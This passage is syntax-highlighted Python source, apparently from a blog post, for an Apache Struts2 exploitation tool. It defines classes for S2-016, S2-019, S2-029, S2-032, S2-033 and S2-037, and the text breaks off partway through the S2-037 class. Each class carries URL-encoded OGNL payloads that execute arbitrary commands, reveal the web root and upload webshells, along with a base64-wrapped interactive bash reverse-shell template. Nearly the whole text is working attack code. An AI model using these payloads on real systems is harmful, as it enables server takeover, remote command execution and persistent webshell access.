class="string">&quot;redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22&#123;path&#125;%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        self.exec_payload = <span class="string">&quot;payload1&quot;</span></span><br><span class="line">        self.exec_dict = &#123;<span class="string">&quot;payload1&quot;</span>: self.exec_cmd1, <span class="string">&quot;payload2&quot;</span>: self.exec_cmd2, <span class="string">&quot;payload3&quot;</span>: self.exec_cmd3&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        num1 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        num2 = random.randint(<span class="number">10000</span>, <span class="number">100000</span>)</span><br><span class="line">        poc = self.check_poc.<span class="built_in">format</span>(num1=num1, num2=num2)</span><br><span class="line">        html = get(self.url + <span class="string">&#x27;?&#x27;</span> + poc, self.headers, self.encoding)</span><br><span class="line">        nn = <span class="built_in">str</span>(num1 + num2)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> nn <span class="keyword">in</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            self.select_exec()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-016&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?&quot;</span> + self.web_path, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">echo_check</span>(<span class="params">self, exec_fun</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        hash_str = get_hash()</span><br><span class="line">        html = exec_fun(<span class="string">&quot;echo &quot;</span> + hash_str)</span><br><span class="line">        <span class="keyword">if</span> hash_str <span class="keyword">in</span> html:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择合适的执行命令的exp&quot;&quot;&quot;</span></span><br><span class="line">        result = self.echo_check(self.exec_cmd1)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            self.exec_payload = <span class="string">&quot;payload1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = self.echo_check(self.exec_cmd2)</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                self.exec_payload = <span class="string">&quot;payload2&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = self.echo_check(self.exec_cmd3)</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    self.exec_payload = <span class="string">&quot;payload3&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.exec_payload = <span class="string">&quot;None&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.exec_payload <span class="keyword">not</span> <span class="keyword">in</span> self.exec_dict:</span><br><span class="line">            <span class="comment"># print(&quot;[+] 本程序S2_016预设EXP对 &#123;url&#125; 无效!&quot;.format(url=self.url))</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        result = self.exec_dict.get(self.exec_payload)(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd1</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(self.url + <span class="string">&quot;?&quot;</span> + self.exec_payload1.<span class="built_in">format</span>(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd2</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?&quot;</span> + self.exec_payload2.<span class="built_in">format</span>(cmd=quote(cmd)), self.headers,</span><br><span class="line">                   self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd3</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?&quot;</span> + self.exec_payload3.replace(<span class="string">&#x27;CMD&#x27;</span>, quote(cmd)).replace(<span class="string">&#x27;ENCODING&#x27;</span>, self.encoding),</span><br><span class="line">                   self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell1</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload1.replace(<span class="string">&#x27;PATH&#x27;</span>, quote(upload_path)).replace(<span class="string">&#x27;SHELL&#x27;</span>, quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell2</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = <span class="string">&quot;t=&quot;</span> + quote(shell)</span><br><span class="line">        web_path = self.get_path()</span><br><span class="line">        upload_path = upload_path.replace(web_path, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        html = post(self.url + <span class="string">&#x27;?&#x27;</span> + self.upload_payload2.<span class="built_in">format</span>(path=upload_path), data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        result = self.upload_shell1(upload_path, shell_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            result = self.upload_shell2(upload_path, shell_path)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_019</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-019漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%23req%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;)%2C%23resp%3D%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;)%2C%23resp.setCharacterEncoding(&#x27;&#123;encoding&#125;&#x27;)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(&#x27;%2F&#x27;))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%23f%3D%23_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23resp%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B1000%5D%2C%23d.read(%23e)%2C%23resp.println(%23e)%2C%23resp.close()&quot;</span></span><br><span class="line">    upload_payload = <span class="string">r&quot;&quot;&quot;debug=command&amp;expression=%23req%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#x27;),%23res%3d%23context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22&#123;path&#125;%22)).append(%23req.getParameter(%22shell%22)).close()&amp;shell=&#123;shell&#125;&quot;&quot;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-019&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&quot;?debug=command&amp;expression=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            payload=self.web_path.<span class="built_in">format</span>(encoding=self.encoding)), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        html = get(</span><br><span class="line">            self.url + <span class="string">&quot;?debug=command&amp;expression=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))),</span><br><span class="line">            self.headers,</span><br><span class="line">            self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">self, upload_path, shell_path</span>):</span></span><br><span class="line">        shell = read_file(shell_path, self.encoding)</span><br><span class="line">        data = self.upload_payload.<span class="built_in">format</span>(path=quote(upload_path), shell=quote(shell))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_029</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-029漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;(%23_memberAccess%5B&#x27;allowPrivateAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;excludedPackageNamePatterns&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;excludedClasses&#x27;%5D%3D%23_memberAccess%5B&#x27;acceptProperties&#x27;%5D%2C%23_memberAccess%5B&#x27;allowPackageProtectedAccess&#x27;%5D%3Dtrue%2C%23_memberAccess%5B&#x27;allowStaticMethodAccess&#x27;%5D%3Dtrue%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            self.data = <span class="string">&quot;message=&#123;exp&#125;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.headers:</span><br><span class="line">            self.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span></span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(html).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">if</span> html:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-029&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        data = self.data.<span class="built_in">format</span>(exp=self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_032</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-032漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=&#123;encoding&#125;&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=&#123;encoding&#125;&amp;cmd=&#123;cmd&#125;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&#x27;?&#x27;</span> + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> html == <span class="string">&quot;1008660253718&quot;</span>:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-032&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_path</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + <span class="string">&#x27;?&#x27;</span> + self.web_path.<span class="built_in">format</span>(encoding=self.encoding), self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd), encoding=self.encoding)</span><br><span class="line">        html = get_stream(self.url + <span class="string">&#x27;?&#x27;</span> + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_033</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-033漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span></span><br><span class="line">    check_poc = <span class="string">&quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10086&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=&#123;cmd&#125;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, data=<span class="literal">None</span>, headers=<span class="literal">None</span>, encoding=<span class="string">&quot;UTF-8&quot;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> url.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            self.url = url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.url = url + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span></span><br><span class="line">        html = get(self.url + self.check_poc, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">if</span> html.startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">        <span class="keyword">elif</span> html == <span class="string">&quot;1008660253718&quot;</span>:</span><br><span class="line">            self.is_vul = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;S2-033&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.is_vul</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">self, cmd</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行命令&quot;&quot;&quot;</span></span><br><span class="line">        payload = self.exec_payload.<span class="built_in">format</span>(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse_shell</span>(<span class="params">self, ip, port</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span></span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S2_037</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;S2-037漏洞检测利用类&quot;&quot;&quot;</span></span><br><span class="line">    info = <span class="string">&quot;[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span></span><br><span class="line">    web_path = <span class="string">&quot;%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;pp=%2f&quot;</span></span><br><span class="line">    exec_payload = <span class="string">&quot;(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=&#123;cmd&#125;&quot;</span></span><br><span class="line">    shell = <span class="string">&quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, 